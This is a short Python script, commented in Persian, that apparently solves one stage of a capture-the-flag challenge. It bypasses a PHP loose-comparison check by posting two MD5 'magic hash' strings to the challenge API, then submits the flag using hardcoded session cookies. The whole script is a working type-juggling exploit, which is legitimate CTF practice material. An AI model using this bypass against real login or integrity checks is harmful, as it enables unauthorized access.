#!/usr/bin/env python3
"""
حل مرحله سوم: نگهبان دربار (negahban)
الگوریتم: دور زدن اعتبارسنجی مقایسه سست PHP (Type Juggling) با MD5 Magic Hashes
"""

import requests
import json

def solve(cookies: dict):
    base_url = 'https://256.yektanet.tech/ramzolmasal/api'
    headers = {'Content-Type': 'application/json'}
    
    # دو رشته جادویی با پیشوند 0e در هش MD5
    sanad1 = '240610708' # md5: 0e462097431906509019562988736854
    sanad2 = 'QNKCDZO'   # md5: 0e830400451993494058024219903391
    
    payload = {
        'sanad1': sanad1,
        'sanad2': sanad2
    }
    
    print(f'[*] ارسال اسناد فریبنده به api/negahban...')
    r = requests.post(f'{base_url}/negahban', headers=headers, cookies=cookies, json=payload)
    resp = r.json()
    print(f'[+] پاسخ نگهبان دربار: {resp}')
    
    if resp.get('mohr'):
        kilid = resp['kilid']
        flag = f'YEK{{{kilid}}}'
        print(f'[+] کلید آزادی دریافت شد: {flag}')
        
        # انتخاب و ثبت
        requests.post(f'{base_url}/select', headers=headers, cookies=cookies, json={'id': 'negahban'})
        sub = requests.post(f'{base_url}/submit', headers=headers, cookies=cookies, json={'flag': flag}).json()
        print(f'[*] نتیجه ثبت پرچم: {sub}')

if __name__ == '__main__':
    cookies = {
        'ctf_device': 'c58274c5d2b8e26db7753999381fcabb',
        'ctf_session': 'b309c321eed958ae047cc0eb89edfea75fdfa4931b4a14f27d0b9bf88ff05a1b'
    }
    solve(cookies)
